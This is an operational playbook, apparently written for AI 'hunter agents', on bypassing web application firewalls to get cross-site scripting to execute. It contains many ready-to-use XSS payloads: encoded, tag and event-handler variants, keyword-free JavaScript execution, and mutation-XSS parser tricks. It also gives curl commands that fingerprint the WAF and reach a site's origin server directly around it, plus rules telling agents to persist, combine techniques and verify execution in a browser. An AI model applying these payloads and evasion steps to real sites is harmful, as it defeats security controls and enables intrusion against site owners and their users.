# WAF Bypass Iteration Protocol

Reference file for all hunter agents when a WAF blocks initial payloads. Do not give up after 3-5 payloads. Work through the categories systematically.

## Detection First

Before trying bypasses, identify the WAF:
```bash
# Check headers
curl -sI "https://TARGET" | grep -iE "cf-ray|server: cloudflare|x-sucuri|x-akamai|x-cdn|x-datadome|server: awselb"

# Trigger a block and read the error page
curl -s "https://TARGET/search?q=<script>alert(1)</script>" | head -c 1000

# Check wafw00f if available
wafw00f https://TARGET 2>/dev/null
```

Record in brain: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> waf "<waf_name>" "<version if visible>"`

## The Bypass Ladder

Work through these in order. Each category is a fundamentally different approach. If one category fails entirely, the next category attacks a different part of the WAF's logic.

### Level 1: Encoding Transforms
The WAF checks one encoding, the browser/server decodes another.

```
URL encoding: %3Cscript%3E → <script>
Double encoding: %253Cscript%253E
Unicode encoding: \u003cscript\u003e
HTML entities: &#60;script&#62; or &#x3C;script&#x3E;
Mixed case: <ScRiPt>
Null bytes: <scri%00pt> (older parsers)
Overlong UTF-8: %C0%BC (non-standard < encoding)
```

### Level 2: Tag Alternatives
The WAF blocks `<script>` and `<img>`, use tags it doesn't know or check.

```
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<isindex type=image src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<meter onmouseover=alert(1)>
```

### Level 3: Event Handler Alternatives
WAF blocks `onerror`, `onload` — use less common handlers.

```
ontoggle, onpointerenter, onpointerleave, onpointerout,
onpointermove, onpointerrawupdate, ontransitionend,
onanimationend, onanimationstart, onbeforetoggle,
onfocusin, oncontextmenu, ondblclick, onauxclick
```

### Level 4: JavaScript Execution Without Keywords
WAF blocks `alert`, `eval`, `document`, `cookie`.

```
# String construction:
eval(atob('YWxlcnQoMSk='))
[].constructor.constructor('alert(1)')()
window['al'+'ert'](1)
self['al'+'ert'](1)
top['al'+'ert'](1)

# Template literals:
`${alert(1)}`

# Arrow functions + destructuring:
({x:alert}={x:alert},x(1))

# Constructor chain:
''['constructor']['constructor']('alert(1)')()

# Reflection:
Reflect.apply(alert, null, [1])

# Import:
import('data:text/javascript,alert(1)')
```

### Level 5: Parser Differentials
The WAF parses the input differently than the browser does.

```
# Mutation XSS (DOMPurify bypass style):
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>

# Namespace confusion:
<svg><desc><template><img src=x onerror=alert(1)>

# Tag balancing tricks:
<img src=x onerror=alert(1)//

# Attribute quirks:
<img src=x onerror/=alert(1)>
<img/src=x/onerror=alert(1)>

# Content-type confusion:
# If the response is text/html but WAF checks for JSON patterns:
{"x":"</script><img src=x onerror=alert(1)>"}
```

### Level 6: Context-Specific Escapes
Not about bypassing WAF on the payload, but escaping the current context first.

```
# Inside JS string:
'-alert(1)-'
\'-alert(1)//
</script><img src=x onerror=alert(1)>

# Inside HTML attribute:
" onfocus=alert(1) autofocus="
' onfocus='alert(1)' autofocus='

# Inside URL parameter in JS:
javascript:alert(1)//
data:text/html,<script>alert(1)</script>

# Inside CSS:
expression(alert(1))  (IE only, historical)
</style><img src=x onerror=alert(1)>
```

### Level 7: Infrastructure Bypasses
Don't bypass the WAF — go around it.

```
# Direct origin IP (if discoverable):
# Check: censys, shodan, security trails, DNS history
curl -H "Host: target.com" http://ORIGIN_IP/vuln?q=<script>alert(1)</script>

# Alternate port:
https://target.com:8443/vuln?q=payload

# IPv6 (WAF may not cover):
curl -6 "https://[ipv6-addr]/vuln?q=payload"

# Subdomain not behind WAF:
# Some subdomains route to origin directly

# HTTP vs HTTPS:
# WAF may only inspect one protocol
```

## Process Rules

1. **Try at least 3 payloads from each level before moving to the next.** One failure doesn't mean the whole category fails.
2. **Record what gets blocked and what gets through.** The WAF's block pattern reveals what it checks: `brain.py record <target> waf-bypass "Level 2 tags: svg blocked, details passes" "..."`
3. **Combine levels.** Level 1 encoding + Level 2 tag + Level 4 JS obfuscation = compound bypass.
4. **Time box: 20 minutes total on bypass attempts.** If nothing works after 20 min, record the WAF profile in brain and move to a different endpoint/vuln class.
5. **Search writeups first.** `search_techniques "cloudflare bypass"` or `search_writeups "<waf_name> bypass XSS"` — someone may have published a bypass for this exact WAF version.
6. **If bypass works in curl, BROWSER VERIFY.** WAF bypass + browser execution = confirmed. WAF bypass + curl reflection only = unverified.
